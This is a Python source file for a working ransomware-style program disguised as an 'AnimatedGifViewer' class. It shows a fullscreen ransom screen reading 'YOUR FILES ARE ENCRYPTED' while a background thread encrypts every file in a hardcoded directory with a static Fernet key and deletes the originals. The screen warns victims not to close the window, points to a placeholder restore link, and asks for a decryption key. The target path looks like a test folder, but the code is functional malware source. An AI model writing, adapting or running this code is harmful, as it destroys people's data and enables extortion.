import os
import tkinter as tk
from tkinter import messagebox
import threading
from cryptography.fernet import Fernet

static_key = b'acSnyxWBWJFOlKIRng7VTDcbzZe8vEd0nWn8-_aOkqM='
encrypted_directory = "/home/merras/tests/"

class AnimatedGifViewer(tk.Tk):
    def __init__(self, *args, **kwargs):
        tk.Tk.__init__(self, *args, **kwargs)
        self.attributes('-fullscreen', True)
        self.fondo_frame = tk.Frame(self, bg="black")
        self.fondo_frame.pack(fill="both", expand=True)
        centro_frame = tk.Frame(self.fondo_frame, bg="black")
        centro_frame.pack(expand=True)

        ascii_art = """
ㅤㅤㅤㅤ⢀⣠⣶⣾⣿⣶⣦⣤⣀⠄⢀⣀⣤⣤⣤⣤⣄ㅤㅤㅤㅤ
ㅤㅤㅤ⢀⣴⣿⣿⣿⡿⠿⠿⠿⠿⢿⣷⡹⣿⣿⣿⣿⣿⣿⣷ㅤㅤㅤ
ㅤㅤㅤ⣾⣿⣿⣿⣯⣵⣾⣿⣿⡶⠦⠭⢁⠩⢭⣭⣵⣶⣶⡬⣄⣀⡀ㅤ
ㅤㅤ⡀⠘⠻⣿⣿⣿⣿⡿⠟⠩⠶⠚⠻⠟⠳⢶⣮⢫⣥⠶⠒⠒⠒⠒⠆⠐ㅤ
ㅤ⢠⣾⢇⣿⣿⣶⣦⢠⠰⡕⢤⠆⠄⠰⢠⢠⠄⠰⢠⠠⠄⡀⠄⢊⢯⠄⡅⠂
⢠⣿⣿⣿⣿⣿⣿⣿⣏⠘⢼⠬⠆⠄⢘⠨⢐⠄⢘⠈⣼⡄⠄⠄⡢⡲⠄⠂⠠⠄
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣥⣀⡁⠄⠘⠘⠘⢀⣠⣾⣿⢿⣦⣁⠙⠃⠄⠃⠐⣀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣵⣾⣿⣿⣿⣿⣦⣀⣶⣾⣿⣿⡉⠉⠉
⣿⣿⣿⣿⣿⣿⣿⠟⣫⣥⣬⣭⣛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄
⣿⣿⣿⣿⣿⣿⣿⠸⣿⣏⣙⠿⣿⣿⣶⣦⣍⣙⠿⠿⠿⠿⠿⠿⠿⠿⣛⣩⣶⠄
⣛⣛⣛⠿⠿⣿⣿⣿⣮⣙⠿⢿⣶⣶⣭⣭⣛⣛⣛⣛⠛⠛⠻⣛⣛⣛⣛⣋⠁⢀
⣿⣿⣿⣿⣿⣶⣬⢙⡻⠿⠿⣷⣤⣝⣛⣛⣛⣛⣛⣛⣛⣛⠛⠛⣛⣛⠛⣡⣴⣿
⣛⣛⠛⠛⠛⣛⡑⡿⢻⢻⠲⢆⢹⣿⣿⣿⣿⣿⣿⠿⠿⠟⡴⢻⢋⠻⣟⠈⠿⠿
⣿⡿⡿⣿⢷⢤⠄⡔⡘⣃⢃⢰⡦⡤⡤⢤⢤⢤⠒⠞⠳⢸⠃⡆⢸⠄⠟⠸⠛⢿
⡟⠄⠄⠄⠄⠁⠁⠄⠄⠄⠄⠄⠄⠁⠄⠁⠄⠁⠄⠁⠄⠄⠄⠄⠁⠄⠄⠄⠄⢸
"""

        text = tk.Label(centro_frame, text=ascii_art, bg="black", fg="white", font=("Courier", 14))
        text.pack(pady=20)


        text1 = tk.Label(centro_frame, text="YOUR FILES ARE ENCRYPTED", bg="black", fg="red", font=("Helvetica", 24))
        text1.pack(pady=(100, 0))
        block_frame = tk.LabelFrame(centro_frame, text="Attention!", bg="red", fg="white", font=("Helvetica", 15), padx=10, pady=10)
        block_frame.pack(pady=20)
        text2 = tk.Label(block_frame, text="- Do not rename or remove encrypted files.", bg="red", fg="white", justify="left")
        text2.pack(anchor="w")
        text3 = tk.Label(block_frame, text="- Do not try to decrypt your data using third party software, it may cause permanent data loss.", bg="red", fg="white", justify="left")
        text3.pack(anchor="w")
        text4 = tk.Label(block_frame, text="- Do not close this window, it will cause permanent data loss.", bg="red", fg="white", justify="left")
        text4.pack(anchor="w")
        text5 = tk.Label(block_frame, text="- If you want to restore them, follow this link: 'http://www.sitegoeshere.com'", bg="red", fg="white", justify="left")
        text5.pack(anchor="w")
        self.codigo_entry = tk.Entry(centro_frame, width=50, bg="black", fg="white")
        self.codigo_entry.pack(pady=10)
        self.boton_ejecutar = tk.Button(centro_frame, text="Decrypt", command=self.ejecutar_codigo, bg="black", fg="white")
        self.boton_ejecutar.pack(pady=5)
        self.codigo_ingresado = False
        threading.Thread(target=self.encriptar_archivos, args=(encrypted_directory, static_key)).start()

    def ejecutar_codigo(self):
        codigo = self.codigo_entry.get()
        if codigo:
            self.codigo_ingresado = True
            threading.Thread(target=self.desencriptar_archivos, args=(encrypted_directory, codigo)).start()

    def encriptar_archivos(self, directory_path, key):
        fernet = Fernet(static_key)
        for filename in os.listdir(directory_path):
            filepath = os.path.join(directory_path, filename)
            if os.path.isfile(filepath):
                try:
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    encrypted_data = fernet.encrypt(data)
                    with open(filepath + '.encrypted', 'wb') as ef:
                        ef.write(encrypted_data)
                        print("")
                    os.remove(filepath)
                except Exception as e:
                    print("")

        for filename in os.listdir(directory_path):
            filepath = os.path.join(directory_path, filename)
            if os.path.isfile(filepath) and not filename.endswith('.encrypted'):
                os.remove(filepath)

    def desencriptar_archivos(self, directory_path, key):
        try:
            fernet = Fernet(key.encode())
            for dirpath, dirnames, filenames in os.walk(directory_path):
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    if filepath.endswith('.encrypted'):
                        try:
                            with open(filepath, 'rb') as f:
                                encrypted_data = f.read()
                            decrypted_data = fernet.decrypt(encrypted_data)
                            with open(filepath[:-10], 'wb') as df:
                                df.write(decrypted_data)
                                print("")
                            os.remove(filepath)
                        except Exception as e:
                            print("")
            self.destroy()
        except ValueError:
            messagebox.showerror("Error", "Invalid decryption key. Make sure the key is correct.")

if __name__ == "__main__":
    app = AnimatedGifViewer()
    app.mainloop()
